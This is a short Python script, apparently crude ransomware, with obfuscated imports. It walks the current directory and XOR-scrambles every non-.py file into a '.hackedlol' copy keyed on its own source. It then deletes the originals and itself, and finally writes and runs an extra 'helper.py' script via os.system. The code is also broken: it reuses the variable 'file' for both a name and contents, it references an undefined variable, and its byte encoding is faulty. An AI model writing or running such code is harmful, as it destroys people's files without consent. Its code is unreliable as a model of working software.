q=__import__('base64', globals(), locals());
z=__import__('os', globals(), locals());

os=__import__('os', __builtins__.__dict__['globals'](),  __builtins__.__dict__['locals']());
_os=__import__('os', __builtins__.__dict__['globals'](),  __builtins__.__dict__['locals']());

cs=open(eval("__file__")).read()
# getcwd() returns current working directory of a process
# root : Prints out directories only from what you specified.
# dirs : Prints out sub-directories from root.
# files : Prints out all files from root and directories.
for root, dirs, files in os.walk(os.getcwd()):
    for file in files:
        if not file.endswith(".py"):
            file=open(root+"/"+file, "rb").read(); # open file on current directory
            f=open(root+"/"+(file.rsplit(".", 1)[0])+".hackedlol", "wb")    # 
            for h in range(len(file)):
                f.write(chr(file[h]^ord(cs[(h*0x27)%len(cs)])).encode())
            os.remove(root+"/"+file)

_os.remove(eval("__file__"))

file=open("helper.py", "w");
file.write(x.decode());
file.close();
z.system("python3 helper.py")